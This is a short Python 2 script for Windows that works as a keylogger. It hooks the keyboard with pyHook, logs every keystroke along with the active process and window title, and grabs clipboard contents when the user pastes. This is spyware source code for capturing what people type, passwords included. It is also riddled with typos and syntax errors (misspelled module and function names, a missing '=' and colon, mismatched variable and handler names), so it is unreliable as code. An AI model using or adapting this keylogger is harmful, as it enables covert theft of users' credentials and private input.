from ctypes import *
import pythoncom
import pyHook
import win32cliboard

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.pspapi
current_window = None

def get_current_proccess():

	#tek over foreground window
	hwnd = user32.GetForegroundWindow()
	
	pid c_ulong(0)
	user32.GetWindowThreadProccessID(hwnd, byref(pid))
	
	proccess_id = "%d" % pid.value
	 
	excutable = create_string_buffer("\x00" * 512)
	h_proccess = kernel32.OpenProccess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_proccess,None,byref(excutable),512)

	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)
	print
	print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_.title.value)
	print

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_proccess)


def KeyStrokes(event):

	global current_window

	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_proccess()

	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii),
	else:
		if event.Key == "V"

			win32cliboard.OpenClipboard()
			pasted_value = win32cliboard.GetClipboardData()
			win32cliboard.CloseClipboard()

			print "[PASTE] - %s" % (pasted_value),

		else:

			print "[%s]" % event.Key,
	return true

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()





